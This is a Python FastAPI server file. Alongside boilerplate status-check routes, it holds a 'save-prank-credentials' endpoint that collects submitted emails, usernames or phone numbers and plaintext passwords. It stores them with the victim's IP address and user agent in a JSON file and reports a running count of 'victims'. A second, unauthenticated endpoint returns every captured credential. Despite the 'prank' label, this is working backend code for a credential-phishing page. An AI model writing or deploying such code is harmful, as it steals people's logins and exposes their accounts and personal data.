from fastapi import FastAPI, APIRouter, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List
import uuid
from datetime import datetime
import json
from fastapi import HTTPException


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Configure logging first
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

class PrankCredentials(BaseModel):
    email: str  # This will be email, username, or phone number
    password: str
    userAgent: str
    url: str
    prankedAt: str
    timestamp: int

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

@api_router.post("/save-prank-credentials")
async def save_prank_credentials(credentials: PrankCredentials, request: Request):
    try:
        # Create the pranked_user.json file path
        credentials_file = ROOT_DIR / "pranked_user.json"
        
        # Load existing data or create empty list
        if credentials_file.exists():
            try:
                with open(credentials_file, 'r') as f:
                    content = f.read().strip()
                    if content:
                        existing_data = json.loads(content)
                    else:
                        existing_data = []
            except (json.JSONDecodeError, ValueError):
                # If file exists but has invalid JSON, start fresh
                existing_data = []
        else:
            existing_data = []
        
        # Get client IP address
        client_ip = request.client.host
        
        # Check for forwarded IPs (if behind proxy)
        forwarded_for = request.headers.get("X-Forwarded-For")
        if forwarded_for:
            client_ip = forwarded_for.split(",")[0].strip()
        
        # Add new credentials to the list
        new_entry = {
            "id": str(uuid.uuid4()),
            "emailOrUsername": credentials.email,  # Can be email, username, or phone
            "password": credentials.password,
            "ipAddress": client_ip,
            "userAgent": credentials.userAgent,
            "url": credentials.url,
            "prankedAt": credentials.prankedAt,
            "timestamp": credentials.timestamp
        }
        
        existing_data.append(new_entry)
        
        # Save back to file
        with open(credentials_file, 'w') as f:
            json.dump(existing_data, f, indent=2)
        
        logger.info(f"🎭 Saved pranked credentials for: {credentials.email}")
        
        return {
            "success": True, 
            "message": "Credentials saved successfully",
            "total_victims": len(existing_data),
            "victim_identifier": credentials.email,  # Could be email, username, or phone
            "victim_ip": client_ip
        }
        
    except Exception as e:
        logger.error(f"Error saving prank credentials: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to save credentials: {str(e)}")

@api_router.get("/pranked-credentials")
async def list_pranked_credentials():
    """
    Returns the saved credentials from pranked_user.json as a list.
    If the file does not exist or is invalid/empty, returns an empty list.
    """
    credentials_file = ROOT_DIR / "pranked_user.json"
    if not credentials_file.exists():
        return []
    try:
        with open(credentials_file, 'r') as f:
            content = f.read().strip()
            if not content:
                return []
            data = json.loads(content)
            if isinstance(data, list):
                return data
            return []
    except (json.JSONDecodeError, ValueError):
        return []

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()